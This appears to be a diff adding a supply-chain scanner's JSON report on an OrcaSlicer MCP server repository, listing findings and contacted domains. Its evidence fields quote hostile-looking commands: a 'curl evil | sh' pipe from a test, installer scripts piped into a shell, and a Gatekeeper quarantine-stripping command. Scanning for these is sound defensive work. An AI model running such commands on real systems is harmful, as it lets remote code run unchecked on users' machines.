@@ -1,0 +1,79 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "MaxEllis/orcaslicer-mcp",
+    "version": "f0eefe42e47a5ada8e5fd824fd4ffac0b121b979",
+    "download": "https://codeload.github.com/MaxEllis/orcaslicer-mcp/tar.gz/f0eefe42e47a5ada8e5fd824fd4ffac0b121b979"
+  },
+  "archive_sha256": "a56862883329cba64700c048e28a7ec7802045c0ebc09efb068e17079d09bcda",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer-mcp-f0eefe42e47a5ada8e5fd824fd4ffac0b121b979/tests/test_guard.py",
+      "line": 84,
+      "evidence": "curl evil | sh",
+      "file_sha256": "b53e8be352ac11413ec1ae250dc93c793a4924066a7903efd6aa6324a7de855f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer-mcp-f0eefe42e47a5ada8e5fd824fd4ffac0b121b979/README.md",
+      "line": 123,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "80066c0fe114357bf797726dfdee732e7f5cfebbb90e5a668232ad3a7b9df3b5"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "orcaslicer-mcp-f0eefe42e47a5ada8e5fd824fd4ffac0b121b979/docs/superpowers/specs/2026-07-20-orcaslicer-mcp-public-release-design.md",
+      "line": 81,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "10821ba7687ca1d285f80820927d1e5f8dd8a6e3c9b3b60040e5c3363f425b03"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "orcaslicer-mcp-f0eefe42e47a5ada8e5fd824fd4ffac0b121b979/mcpb/server/index.js",
+      "line": 55,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "666b10858ddd72322138a01d7849152a7e2debfcf87d39ff482ba3a5fa9020da"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "192.0.2.10",
+    "192.0.2.20",
+    "192.0.2.5",
+    "192.0.2.99",
+    "astral.sh",
+    "buymeacoffee.com",
+    "cdn.buymeacoffee.com",
+    "docs.astral.sh",
+    "files.pythonhosted.org",
+    "fsf.org",
+    "github.com",
+    "glama.ai",
+    "hydraraptor.blogspot.com",
+    "img.shields.io",
+    "keepachangelog.com",
+    "lobehub.com",
+    "modelcontextprotocol.io",
+    "printer-test.local",
+    "printer.example",
+    "pypi.org",
+    "registry.modelcontextprotocol.io",
+    "semver.org",
+    "static.modelcontextprotocol.io",
+    "www.cnckitchen.com",
+    "www.gnu.org"
+  ],
+  "install_script": false,
+  "score": "high"
+}
